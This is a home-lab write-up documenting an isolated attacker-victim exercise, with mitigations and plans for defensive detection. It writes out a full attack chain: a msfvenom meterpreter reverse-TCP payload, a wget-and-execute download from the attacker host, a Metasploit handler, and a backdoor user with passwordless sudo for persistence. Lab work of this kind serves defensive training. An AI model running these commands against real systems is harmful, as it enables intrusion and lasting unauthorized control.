ATTACKER-DEFENDER LAB

Author: Bobo Nikolov
Date: 27-10-2025
Status: In Progress (Defender / SecurityOnion phase next)


---


- Objective
Build isolated attacker <> victim lab to demonstrate reconnaissance, initial access, execution, persistence, and privilege escalation — then add a defender (SecurityOnion) to capture telemetry and create detections.

- Architecture and Scope
"lab_attacker" - Kali Linux(Internal Network(labnet)/NAT)IP 10.10.10.10
"lab_victim" - Ubuntu Linux(Internal Network(labnet)/Internal Network(intnet))IP 10.10.10.20
"Network" - Internal Network only(Isolated)
"Snapshot" - Created before testing and reverted again for repeatability.

NOTE: All work is performed on my VM's only!


---


  ENUMERATION 
  
(In linux terminal)Run:
nmap -sS -sV 10.10.10.20
'evidence/2025-10-27_05-52_AM_Screenshot_Enumeration_ .png'


---


  INITIAL ACCESS AND EXECUTION

 - Summary
Created a small Linux meterpreter ELF payload on attacker host, served it via HTTP server, fetched and executed it on the victim, then handled the incoming meterpreter session from Metasploit.

 - Artifacts / screenshots
Payload creation: 'evidence/2025-10-27_15-32-08_Payload_Creation_Initial_Access_Execution.png'
Serving payload: 'evidence/2025-10-27_15-38-08_Serving_Payload_Initial_Access_Execution.png'
Payload downloaded on victim: 'evidence/2025-10-27_15-42-04_Payload_On_Victim_Initial_Access_Execution.png'
Exploit/run and handler: 'evidence/2025-10-27_15-47-45_Exploit_Run_And_Waiting_Initial_Access_Execution.png'
Successful execution(meterpreter/shell proof)- 'evidence/2025-10-27_15-58-31_Successful-Execution_Initial-Access-Execution.png'

 - What I did
Generated a Linux ELF reverse-TCP payload on the attacker:
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -O shell32.elf

 - Served the payload from attacker
python3 -m http.server 8000 --bind 10.10.10.10

 - On the victim fetched and executed it 
wget http://10.10.10.10:8000/shell32.elf -O /tmp/shell && chmod +x /tmp/shell

 - Started a multi handler on Metasploit
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 10.10.10.10
set LPORT 4444


---


   PERSISTANCE
   
 - Summary
To demonstrate persistance detection and to create realistic defender telemetry for the upcoming SecurityOnion phase, a benign backdoor user was created and a sudoers entry added. All were documented and snapshot was reverted.

 - Artifacts / Screenshots
-Persistance (new user created): 'evidence/2025-10-27_17-59-25_Persistance-New-User_Persistance.png'

 - Commands Executed
sudo useradd -, -s /bin/bash backdoor_user //Creating a new user
echo 'backdoor_user:P@ssword123!' | sudo chpasswd //Setting a password

// Add sudoers entry (NOPASSWD) to simulate privilege-capable persistence

echo 'backdoor_user ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/backdoor_user
sudo chmod 440 /etc/sudoers.d/backdoor_user


---


   PRIVILEGE ESCALATION
   
 - Summary
After intitial access, local privilege escalation was demonstrated - minimal proof (whoami / id) captured to validate root access. This was performed only to verify impact for detection engineering.

 - Artifact / Screenshot
-Privilege escalation(root obtained): 'evidence/2025-10-27_18-49-33_Privilege-Escalation.png'

 - Proof commands / notes
// From the interactive shell on meterpreter > shell
whoami
id

//In some cases a known local vector was used and 'sudo /bin/bash' or similar verified root:
sudo /bin/bash
whoami //lead to root


---


   CONCLUSION

This lab demonstrated a complete attacker workflow in an isolated environment: reconnaissance, payload creation and delivery, successful remote code execution, a persistence demonstration, and local privilege escalation (proof-of-concept). The aim was not to cause damage but to produce realistic telemetry and artifacts that a defender can use to tune detections and playbook responses.

The environment was fully isolated and snapshotted before testing; all changes were reverted after evidence capture. This project serves as a foundation for the defender phase (SecurityOnion), where I will ingest network and host telemetry and author detection rules.


---


   LESSION'S LEARNED AND MITIGATION

  Takeaways
  
- Simple file-download + execute flows are a high-risk vector (e.g. `wget` + `chmod` + run). Prevent by restricting outbound HTTP to unapproved hosts and enforcing execution policies.
- Creation of sudoers/NOPASSWD entries is a common persistence pattern — monitor `/etc/sudoers.d/` and user creation events.
- Local privilege escalation vectors (SUID binaries, misconfigured services) remain a rapid path to full compromise — remove unnecessary SUID/privileged binaries and harden kernel/service updates.

  Recommended mitigation
  
- Block unneeded inbound services; harden public-facing services.
- Enforce least privilege and MFA for administrative access.
- Instrument hosts with sysmon/auditd and forward to your SIEM; create alerts for: unexpected `wget`/`curl` + `chmod +x`, new `/etc/sudoers.d/` files, and new user creation.
- Add network egress restrictions to limit direct payload fetch from attacker-controlled HTTP servers.


---


  Next steps (roadmap)

- SecurityOnion integration (planned): deploy sensor/manager, ingest Zeek/Suricata logs, simulate the attack again, and capture detection telemetry.  
- Detection engineering: write Sigma/Suricata rules and Splunk/SO correlation searches for this scenario.  
- Lateral movement (optional): expand the lab to include a second internal host to demonstrate lateral movement and network-based detection. (WIP — planned for next iteration)


---


  Appendix – Commands & Artifacts

Important commands used (sanitized)

```bash
# Recon
nmap -sS -sV 10.10.10.20

# Payload creation
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell32.elf

# Serve payload
python3 -m http.server 8000 --bind 10.10.10.10

# Victim (lab-only)
wget http://10.10.10.10:8000/shell32.elf -O /tmp/shell && chmod +x /tmp/shell && /tmp/shell

# Persistence (lab-only)
sudo useradd -m -s /bin/bash backdoor_user
echo 'backdoor_user:Password123!' | sudo chpasswd
echo 'backdoor_user ALL=(ALL) NOPASSWD:ALL' | sudo tee /etc/sudoers.d/backdoor_user
sudo chmod 440 /etc/sudoers.d/backdoor_user



